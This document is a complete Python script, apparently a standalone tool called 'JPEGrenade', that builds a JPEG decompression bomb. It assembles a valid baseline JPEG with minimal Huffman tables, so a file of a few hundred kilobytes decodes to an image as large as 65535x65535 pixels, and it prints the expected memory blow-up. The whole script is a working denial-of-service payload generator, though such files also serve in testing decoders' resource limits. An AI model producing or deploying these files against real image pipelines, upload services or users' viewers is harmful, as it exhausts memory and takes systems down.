#!/usr/bin/env python3
"""
JPEGrenade — JPEG Decompression Bomb Generator

Creates a minimal JPEG file that decompresses into a massive image,
without holding the full image in memory during creation.

Reference: ITU-T T.81 (JPEG specification)
https://www.w3.org/Graphics/JPEG/itu-t81.pdf
"""

import struct
import math
import sys
import argparse


def marker(code):
    """JPEG marker: 0xFF + code byte."""
    return struct.pack('BB', 0xFF, code)


def segment(marker_code, payload):
    """JPEG segment: marker + 2-byte length (includes itself) + payload."""
    length = struct.pack('>H', 2 + len(payload))
    return marker(marker_code) + length + payload


def build_app0_jfif():
    """APP0 JFIF header for viewer compatibility (Table B.6)."""
    data = b'JFIF\x00'           # Identifier
    data += struct.pack('>BB', 1, 1)  # Version 1.1
    data += struct.pack('B', 0)       # No aspect ratio
    data += struct.pack('>HH', 1, 1)  # Pixel density 1:1
    data += struct.pack('BB', 0, 0)   # No thumbnail
    return segment(0xE0, data)


def build_dqt(table_id=0):
    """
    DQT — Define Quantization Table (Section B.2.4.1).
    All values = 1. Doesn't matter since all coefficients are 0.
    """
    pq_tq = (0 << 4) | table_id  # 8-bit precision
    return segment(0xDB, struct.pack('B', pq_tq) + bytes([1] * 64))


def build_sof0(width, height, num_components):
    """SOF0 — Start of Frame, Baseline DCT (Section B.2.2)."""
    data = struct.pack('>BHHB', 8, height, width, num_components)
    for i in range(num_components):
        # Component ID, H|V sampling (1x1), quant table 0
        data += struct.pack('BBB', i + 1, 0x11, 0)
    return segment(0xC0, data)


def build_dht(tc, th, bits, huffval):
    """
    DHT — Define Huffman Table (Section B.2.4.2).
    tc: 0=DC, 1=AC. th: table ID.
    bits: 16 values (count of codes per length 1..16).
    huffval: symbol values.
    """
    data = struct.pack('B', (tc << 4) | th)
    data += bytes(bits) + bytes(huffval)
    return segment(0xC4, data)


def build_sos(num_components):
    """SOS — Start of Scan (Section B.2.3)."""
    data = struct.pack('B', num_components)
    for i in range(num_components):
        # Component selector, DC table 0 | AC table 0
        data += struct.pack('BB', i + 1, 0x00)
    data += struct.pack('BBB', 0, 63, 0x00)  # Ss, Se, Ah|Al
    return segment(0xDA, data)


def build_entropy_data(width, height, num_components):
    """
    Build entropy-coded segment for a uniform gray-128 image.

    Gray 128 → level shift → 0 → DCT → all zeros → quantize → all zeros.

    With custom Huffman tables:
      DC category 0 → code "0" (1 bit)
      AC EOB        → code "0" (1 bit)
    Each 8×8 block = 2 zero-bits.

    The entire bitstream is zeros → bytes are 0x00 → no byte stuffing needed.
    """
    blocks_x = math.ceil(width / 8)
    blocks_y = math.ceil(height / 8)
    total_blocks = blocks_x * blocks_y * num_components
    total_bits = total_blocks * 2

    full_bytes = total_bits // 8
    remaining = total_bits % 8

    # All zero-bits → all 0x00 bytes
    data = bytearray(full_bytes)

    # Pad incomplete last byte with 1-bits (spec B.2.1)
    if remaining > 0:
        data.append((1 << (8 - remaining)) - 1)

    return bytes(data)


def create_jpeg_bomb(width, height, filename, color=False):
    """Assemble a complete JPEG decompression bomb."""
    nc = 3 if color else 1  # number of components

    jpeg = bytearray()
    jpeg += marker(0xD8)                         # SOI
    jpeg += build_app0_jfif()                     # JFIF
    jpeg += build_dqt(0)                          # Quantization table

    jpeg += build_sof0(width, height, nc)         # Frame header

    # Optimized DC Huffman: 2 codes of length 1 → "0"=cat0, "1"=cat1
    jpeg += build_dht(0, 0,
                      [2] + [0]*15,
                      [0, 1])

    # Optimized AC Huffman: 2 codes of length 1 → "0"=EOB, "1"=(0,1)
    jpeg += build_dht(1, 0,
                      [2] + [0]*15,
                      [0x00, 0x01])

    jpeg += build_sos(nc)                         # Scan header
    jpeg += build_entropy_data(width, height, nc) # Compressed data
    jpeg += marker(0xD9)                          # EOI

    with open(filename, 'wb') as f:
        f.write(jpeg)

    return len(jpeg)


def human_size(n):
    for u in ['B', 'KB', 'MB', 'GB', 'TB']:
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} PB"


def main():
    p = argparse.ArgumentParser(
        description='JPEGrenade — JPEG Decompression Bomb Generator')
    p.add_argument('-W', '--width',  type=int, default=65535)
    p.add_argument('-H', '--height', type=int, default=65535)
    p.add_argument('-c', '--color',  action='store_true',
                   help='YCbCr (3 ch) instead of grayscale')
    p.add_argument('-o', '--output', default='bomb.jpg')
    args = p.parse_args()

    if not (1 <= args.width <= 65535 and 1 <= args.height <= 65535):
        print("Error: dimensions must be 1..65535")
        sys.exit(1)

    nc = 3 if args.color else 1
    bx = math.ceil(args.width / 8)
    by = math.ceil(args.height / 8)
    total_blocks = bx * by * nc
    decoded = args.width * args.height * nc
    display = args.width * args.height * 4  # RGBA

    print(f"JPEGrenade")
    print(f"{'='*40}")
    print(f"Image:    {args.width} x {args.height} px "
          f"({'YCbCr' if args.color else 'Gray'})")
    print(f"Blocks:   {total_blocks:,}")
    print(f"Est file: {human_size(total_blocks * 2 / 8)}")
    print(f"Decoded:  {human_size(decoded)}")
    print(f"Display:  {human_size(display)} (RGBA)")
    print(f"Ratio:    {display / (total_blocks * 2 / 8):.0f}x")
    print()

    size = create_jpeg_bomb(args.width, args.height, args.output, args.color)
    print(f"Created '{args.output}' — {human_size(size)}")
    print(f"WARNING: opening may consume {human_size(display)} of RAM!")


if __name__ == '__main__':
    main()
